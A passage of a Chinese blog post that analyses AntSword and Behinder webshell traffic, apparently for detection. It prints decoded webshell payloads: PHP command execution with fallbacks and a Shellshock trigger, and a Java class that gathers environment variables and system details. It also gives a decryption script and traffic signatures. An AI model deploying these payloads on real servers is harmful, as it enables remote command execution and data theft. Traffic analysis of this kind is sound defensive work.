class="string">&quot;-c \&quot;<span class="subst">&#123;$s&#125;</span>\&quot;&quot;</span> : <span class="string">&quot;/c \&quot;<span class="subst">&#123;$s&#125;</span>\&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置环境变量路径</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$d</span>, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">&quot;/&quot;</span>) &#123;</span><br><span class="line">        @<span class="title function_ invoke__">putenv</span>(<span class="string">&quot;PATH=&quot;</span> . <span class="title function_ invoke__">getenv</span>(<span class="string">&quot;PATH&quot;</span>) . <span class="string">&quot;:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        @<span class="title function_ invoke__">putenv</span>(<span class="string">&quot;PATH=&quot;</span> . <span class="title function_ invoke__">getenv</span>(<span class="string">&quot;PATH&quot;</span>) . <span class="string">&quot;;C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果环境变量字符串不为空，设置环境变量</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$envstr</span>)) &#123;</span><br><span class="line">        <span class="variable">$envarr</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;|||asline|||&quot;</span>, <span class="variable">$envstr</span>); <span class="comment">// 根据分隔符分割环境变量</span></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$envarr</span> <span class="keyword">as</span> <span class="variable">$v</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$v</span>)) &#123;</span><br><span class="line">                @<span class="title function_ invoke__">putenv</span>(<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;|||askey|||&quot;</span>, <span class="string">&quot;=&quot;</span>, <span class="variable">$v</span>)); <span class="comment">// 设置环境变量</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$r</span> = <span class="string">&quot;<span class="subst">&#123;$p&#125;</span> <span class="subst">&#123;$c&#125;</span>&quot;</span>; <span class="comment">// 构建命令</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查函数是否可用</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fe</span>(<span class="params"><span class="variable">$f</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$d</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;,&quot;</span>, @<span class="title function_ invoke__">ini_get</span>(<span class="string">&quot;disable_functions&quot;</span>)); <span class="comment">// 获取禁用的函数列表</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$d</span>)) &#123;</span><br><span class="line">            <span class="variable">$d</span> = <span class="keyword">array</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$d</span> = <span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;trim&#x27;</span>, <span class="title function_ invoke__">array_map</span>(<span class="string">&#x27;strtolower&#x27;</span>, <span class="variable">$d</span>)); <span class="comment">// 清洗函数名</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (<span class="title function_ invoke__">function_exists</span>(<span class="variable">$f</span>) &amp;&amp; <span class="title function_ invoke__">is_callable</span>(<span class="variable">$f</span>) &amp;&amp; !<span class="title function_ invoke__">in_array</span>(<span class="variable">$f</span>, <span class="variable">$d</span>)); <span class="comment">// 检查函数是否可用</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 处理 Shellshock 漏洞</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">runshellshock</span>(<span class="params"><span class="variable">$d</span>, <span class="variable">$c</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$d</span>, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">&quot;/&quot;</span> &amp;&amp; <span class="title function_ invoke__">fe</span>(<span class="string">&#x27;putenv&#x27;</span>) &amp;&amp; (<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;error_log&#x27;</span>) || <span class="title function_ invoke__">fe</span>(<span class="string">&#x27;mail&#x27;</span>))) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">strstr</span>(<span class="title function_ invoke__">readlink</span>(<span class="string">&quot;/bin/sh&quot;</span>), <span class="string">&quot;bash&quot;</span>) != <span class="literal">FALSE</span>) &#123; <span class="comment">// 检查是否为 bash</span></span><br><span class="line">                <span class="variable">$tmp</span> = <span class="title function_ invoke__">tempnam</span>(<span class="title function_ invoke__">sys_get_temp_dir</span>(), <span class="string">&#x27;as&#x27;</span>); <span class="comment">// 创建临时文件</span></span><br><span class="line">                <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;PHP_LOL=() &#123; x; &#125;; <span class="subst">$c</span> &gt;<span class="subst">$tmp</span> 2&gt;&amp;1&quot;</span>); <span class="comment">// 设置环境变量触发漏洞</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;error_log&#x27;</span>)) &#123;</span><br><span class="line">                    <span class="title function_ invoke__">error_log</span>(<span class="string">&quot;a&quot;</span>, <span class="number">1</span>); <span class="comment">// 触发 error_log</span></span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="title function_ invoke__">mail</span>(<span class="string">&quot;a@127.0.0.1&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;-bv&quot;</span>); <span class="comment">// 发送邮件</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> False; <span class="comment">// 如果不是 bash，返回 False</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$output</span> = @<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$tmp</span>); <span class="comment">// 获取输出</span></span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$tmp</span>); <span class="comment">// 删除临时文件</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$output</span> != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">print</span>(<span class="variable">$output</span>); <span class="comment">// 输出结果</span></span><br><span class="line">                <span class="keyword">return</span> True; <span class="comment">// 返回 True</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> False; <span class="comment">// 返回 False</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行命令</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">runcmd</span>(<span class="params"><span class="variable">$c</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="number">0</span>; <span class="comment">// 初始化返回值</span></span><br><span class="line">        <span class="variable">$d</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]); <span class="comment">// 获取脚本目录</span></span><br><span class="line">        <span class="comment">// 根据可用函数执行命令</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;system&#x27;</span>)) &#123;</span><br><span class="line">            @<span class="title function_ invoke__">system</span>(<span class="variable">$c</span>, <span class="variable">$ret</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;passthru&#x27;</span>)) &#123;</span><br><span class="line">            @<span class="title function_ invoke__">passthru</span>(<span class="variable">$c</span>, <span class="variable">$ret</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;shell_exec&#x27;</span>)) &#123;</span><br><span class="line">            <span class="keyword">print</span>(@<span class="title function_ invoke__">shell_exec</span>(<span class="variable">$c</span>)); <span class="comment">// 执行 shell 命令</span></span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;exec&#x27;</span>)) &#123;</span><br><span class="line">            @<span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>, <span class="variable">$o</span>, <span class="variable">$ret</span>);</span><br><span class="line">            <span class="keyword">print</span>(<span class="title function_ invoke__">join</span>(<span class="string">&quot;&quot;</span>, <span class="variable">$o</span>)); <span class="comment">// 输出命令结果</span></span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;popen&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$fp</span> = @<span class="title function_ invoke__">popen</span>(<span class="variable">$c</span>, <span class="string">&#x27;r&#x27;</span>); <span class="comment">// 打开进程</span></span><br><span class="line">            <span class="keyword">while</span> (!@<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123;</span><br><span class="line">                <span class="keyword">print</span>(@<span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">2048</span>)); <span class="comment">// 输出读取内容</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title function_ invoke__">pclose</span>(<span class="variable">$fp</span>); <span class="comment">// 关闭进程</span></span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;proc_open&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$p</span> = @<span class="title function_ invoke__">proc_open</span>(<span class="variable">$c</span>, <span class="keyword">array</span>(<span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;w&#x27;</span>), <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)), <span class="variable">$io</span>);</span><br><span class="line">            <span class="keyword">while</span> (!@<span class="title function_ invoke__">feof</span>(<span class="variable">$io</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="keyword">print</span>(@<span class="title function_ invoke__">fgets</span>(<span class="variable">$io</span>[<span class="number">1</span>], <span class="number">2048</span>)); <span class="comment">// 输出标准输出</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (!@<span class="title function_ invoke__">feof</span>(<span class="variable">$io</span>[<span class="number">2</span>])) &#123;</span><br><span class="line">                <span class="keyword">print</span>(@<span class="title function_ invoke__">fgets</span>(<span class="variable">$io</span>[<span class="number">2</span>], <span class="number">2048</span>)); <span class="comment">// 输出标准错误</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="title function_ invoke__">fclose</span>(<span class="variable">$io</span>[<span class="number">1</span>]); <span class="comment">// 关闭输出管道</span></span><br><span class="line">            <span class="title function_ invoke__">fclose</span>(<span class="variable">$io</span>[<span class="number">2</span>]); <span class="comment">// 关闭错误管道</span></span><br><span class="line">            <span class="title function_ invoke__">proc_close</span>(<span class="variable">$p</span>); <span class="comment">// 关闭进程</span></span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">fe</span>(<span class="string">&#x27;antsystem&#x27;</span>)) &#123;</span><br><span class="line">            @<span class="title function_ invoke__">antsystem</span>(<span class="variable">$c</span>); <span class="comment">// 调用 antsystem 函数（如果存在）</span></span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">runshellshock</span>(<span class="variable">$d</span>, <span class="variable">$c</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$ret</span>; <span class="comment">// 如果执行成功，返回结果</span></span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$d</span>, <span class="number">0</span>, <span class="number">1</span>) != <span class="string">&quot; / &quot;</span> &amp;&amp; @<span class="title function_ invoke__">class_exists</span>(<span class="string">&quot;COM &quot;</span>)) &#123;</span><br><span class="line">            <span class="variable">$w</span> = <span class="keyword">new</span> <span class="title function_ invoke__">COM</span>(<span class="string">&#x27;WScript.shell&#x27;</span>); <span class="comment">// 使用 COM 对象执行命令（仅限 Windows）</span></span><br><span class="line">            <span class="variable">$e</span> = <span class="variable">$w</span>-&gt;<span class="title function_ invoke__">exec</span>(<span class="variable">$c</span>);</span><br><span class="line">            <span class="variable">$so</span> = <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">StdOut</span>(); <span class="comment">// 获取标准输出</span></span><br><span class="line">            <span class="variable">$ret</span> .= <span class="variable">$so</span>-&gt;<span class="title function_ invoke__">ReadAll</span>(); <span class="comment">// 读取所有输出</span></span><br><span class="line">            <span class="variable">$se</span> = <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">StdErr</span>(); <span class="comment">// 获取标准错误</span></span><br><span class="line">            <span class="variable">$ret</span> .= <span class="variable">$se</span>-&gt;<span class="title function_ invoke__">ReadAll</span>(); <span class="comment">// 读取所有错误</span></span><br><span class="line">            <span class="keyword">print</span>(<span class="variable">$ret</span>); <span class="comment">// 输出结果</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$ret</span> = <span class="number">127</span>; <span class="comment">// 返回默认错误代码</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$ret</span>; <span class="comment">// 返回执行结果</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行构建的命令并输出返回值</span></span><br><span class="line">    <span class="variable">$ret</span> = @<span class="title function_ invoke__">runcmd</span>(<span class="variable">$r</span> . <span class="string">&quot; 2&gt;&amp;1 &quot;</span>);</span><br><span class="line">    <span class="keyword">print</span>(<span class="variable">$ret</span> != <span class="number">0</span>) ? <span class="string">&quot;ret = <span class="subst">&#123;$ret&#125;</span>&quot;</span> : <span class="string">&quot;&quot;</span>; <span class="comment">// 如果有返回值，则打印</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR: //&quot;</span> . <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>(); <span class="comment">// 捕获异常并输出错误信息</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">asoutput</span>(); <span class="comment">// 调用 asoutput 函数输出结果</span></span><br><span class="line"><span class="keyword">die</span>(); <span class="comment">// 终止脚本</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以发现其实就是<code>Webshell</code>的功能实现.然后找到剩下的三个值后,将前面两个字符删除,因为上方代码中有<code>substr</code>函数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /d <span class="string">&quot;c:\\wwwroot\\192.168.232.135\\wp-content\\themes\\twentytwenty&quot;</span>&amp;<span class="built_in">whoami</span>&amp;<span class="built_in">echo</span> [S]&amp;<span class="built_in">cd</span>&amp;<span class="built_in">echo</span> [E]</span><br></pre></td></tr></table></figure><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210282248393.png" data-fancybox="true"/></div></div><p><strong>蚁剑绕过特征流量</strong><br>由于蚁剑中包含了很多加密、绕过插件，所以导致很多流量被加密后无法识别，但是蚁剑混淆加密后还有一个比较明显的特征，即为参数名大多以<code>_0x......=</code>这种形式(下划线可替换为其他).所以，以<code>_0x</code>开头的参数名，后面为加密数据的数据包也可识别为蚁剑的流量特征</p><h2 id="冰蝎"><a href="#冰蝎" class="headerlink" title="冰蝎"></a>冰蝎</h2><h3 id="冰蝎-V2"><a href="#冰蝎-V2" class="headerlink" title="冰蝎 V2"></a>冰蝎 V2</h3><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210311622361.png" data-fancybox="true"/></div></div><ol><li>当冰蝎第一次访问服务器webshell时，以GET方式提交随机数字，因此服务器将会生成16位的随机字符串，写入session后通过print函数将密钥返回客户端 </li><li>冰蝎第二次访问服务器时以相同方式更新密钥 </li><li>经过一次密钥产生与一次密钥更新后，双方开始以对称密钥进行加密通信，首先是冰蝎向服务器发送加密数据，而解密函数在webshell中<div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210311624106.png" data-fancybox="true"/></div></div></li><li>以下是实际冰蝎的攻击Payload</li></ol><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210311626613.png" data-fancybox="true"/></div></div><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210311627397.png" data-fancybox="true"/></div></div><h4 id="jspShell"><a href="#jspShell" class="headerlink" title="jspShell"></a>jspShell</h4><p>来源:<a href="https://cloud.tencent.com/developer/article/1755927">黑伞安全</a><br>解密代码如下:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment">#注：python3 安装 Crypto 是 pip3 install -i https://pypi.tuna.tsinghua.edu.cn/simple pycryptodome</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES  </span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> json   </span><br><span class="line"><span class="comment">#解密</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_decode</span>(<span class="params">data, key</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        aes = AES.new(<span class="built_in">str</span>.encode(key), AES.MODE_ECB)  <span class="comment"># 初始化加密器</span></span><br><span class="line">        decrypted_text = aes.decrypt(data)  <span class="comment"># 解密</span></span><br><span class="line">        decrypted_text = decrypted_text[:-(decrypted_text[-<span class="number">1</span>])]  <span class="comment"># 去除多余补位</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">    <span class="keyword">return</span> decrypted_text</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    key = <span class="string">&#x27;bff6f68a478bdab2&#x27;</span>  <span class="comment"># 密钥长度必须为16、24或32位，分别对应AES-128、AES-192和AES-256</span></span><br><span class="line">data = <span class="string">&quot;&quot;&quot;jsp请求的流量&quot;&quot;&quot;</span></span><br><span class="line">data = base64.b64decode(data)</span><br><span class="line">    a = aes_decode(data,key)</span><br><span class="line">    <span class="built_in">open</span>(<span class="string">&#x27;1.class&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>).write(a)</span><br><span class="line">    <span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure><p>对上方冰蝎V2 jsp请求流量解密后自动保存为class文件,即可使用jadx进行反编译得到原来的Class</p><div class="tag-plugin image"><div class="image-bg"><img src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210311845307.png" data-fancybox="true"/></div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> net.rebeyond.behinder.payload.java;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletOutputStream;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.jsp.PageContext;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: 1.class */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BasicInfo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">equals</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">        <span class="type">PageContext</span> <span class="variable">page</span> <span class="operator">=</span> (PageContext) obj;</span><br><span class="line">        <span class="comment">// 设置响应的编码</span></span><br><span class="line">        page.getResponse().setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">StringBuilder</span> <span class="variable">basicInfo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;&lt;br/&gt;&lt;font size=2 color=red&gt;环境变量:&lt;/font&gt;&lt;br/&gt;&quot;</span>);</span><br><span class="line">            Map&lt;String, String&gt; env = System.getenv();</span><br><span class="line">            <span class="keyword">for</span> (String name : env.keySet()) &#123;</span><br><span class="line">                basicInfo.append(String.valueOf(name) + <span class="string">&quot;=&quot;</span> + env.get(name) + <span class="string">&quot;&lt;br/&gt;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            basicInfo.append(<span class="string">&quot;&lt;br/&gt;&lt;font size=2 color=red&gt;JRE系统属性:&lt;/font&gt;&lt;br/&gt;&quot;</span>);</span><br><span class="line">            <span class="comment">// 获取系统属性</span></span><br><span class="line">            <span class="type">Properties</span> <span class="variable">props</span> <span class="operator">=</span> System.getProperties();</span><br><span class="line">            Set&lt;Map.Entry&lt;Object, Object&gt;&gt; entrySet = props.entrySet();</span><br><span class="line">            <span class="keyword">for</span> (Map.Entry&lt;Object, Object&gt; entry : entrySet) &#123;</span><br><span class="line">                <span class="comment">// 添加到Entry里面</span></span><br><span class="line">                basicInfo.append(entry.getKey() + <span class="string">&quot; = &quot;</span> + entry.getValue() + <span class="string">&quot;&lt;br/&gt;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 返回文件的绝对路径，如果构造的时候是全路径就直接返回全路径，如果构造时是相对路径，就返回当前目录的路径 + 构造 File 对象时的路径</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">currentPath</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;&quot;</span>).getAbsolutePath();</span><br><span class="line">            <span class="type">String</span> <span class="variable">driveList</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="comment">// File.listRoots():返回所有可用文件 System root 的根目录</span></span><br><span class="line">            File[] roots = File.listRoots();</span><br><span class="line">            <span class="keyword">for</span> (File f : roots) &#123;</span><br><span class="line">                driveList = String.valueOf(driveList) + f.getPath() + <span class="string">&quot;;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 获取系统版本</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">osInfo</span> <span class="operator">=</span> String.valueOf(System.getProperty(<span class="string">&quot;os.name&quot;</span>)) + System.getProperty(<span class="string">&quot;os.version&quot;</span>) + System.getProperty(<span class="string">&quot;os.arch&quot;</span>);</span><br><span class="line">            <span class="comment">// 创建Entity</span></span><br><span class="line">            Map&lt;String, String&gt; entity = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">            <span class="comment">// 将基本信息转换为字符串</span></span><br><span class="line">            entity.put(<span class="string">&quot;basicInfo&quot;</span>, basicInfo.toString());</span><br><span class="line">           <span class="comment">// 当前路径</span></span><br><span class="line">            entity.put(<span class="string">&quot;currentPath&quot;</span>, currentPath);</span><br><span class="line">            <span class="comment">// 盘符</span></span><br><span class="line">            entity.put(<span class="string">&quot;driveList&quot;</span>, driveList);</span><br><span class="line">            <span class="comment">// 系统基本信息</span></span><br><span class="line">            entity.put(<span class="string">&quot;osInfo&quot;</span>, osInfo);</span><br><span class="line">            <span class="comment">// 将上面构造好的entity转换为json对象</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> buildJson(entity, <span class="literal">true</span>);</span><br><span class="line">            <span class="comment">// 将session中获取的key转换为字符串</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> page.getSession().getAttribute(<span class="string">&quot;u&quot;</span>).toString();</span><br><span class="line">            <span class="comment">// 拿到页面响应并构造输出</span></span><br><span class="line">            <span class="type">ServletOutputStream</span> <span class="variable">so</span> <span class="operator">=</span> page.getResponse().getOutputStream();</span><br><span class="line">            <span class="comment">// 获取构造好的json对象的字节流,并加密,Key为session中的key</span></span><br><span class="line">            so.write(Encrypt(result.getBytes(), key));</span><br><span class="line">            <span class="comment">// 刷新</span></span><br><span class="line">            so.flush();</span><br><span class="line">            <span class="comment">// 关闭so对象</span></span><br><span class="line">            so.close();</span><br><span class="line">            <span class="comment">// 清除页面输出</span></span><br><span class="line">            page.getOut().clear();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// 输出异常错误</span></span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 加密函数</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] Encrypt(<span class="type">byte</span>[] bs, String key) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// getBytes()方法将 String编码为字节序列并返回一个字节数组. 其中 charsetName是将String 编码为字节数组的特定字符集</span></span><br><span class="line">        <span class="type">byte</span>[] raw = key.getBytes(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">        <span class="comment">// 此类以独立于提供者的方式指定密钥. 它可用于从字节数组构造SecretKey,而无需通过(基于提供程序的) 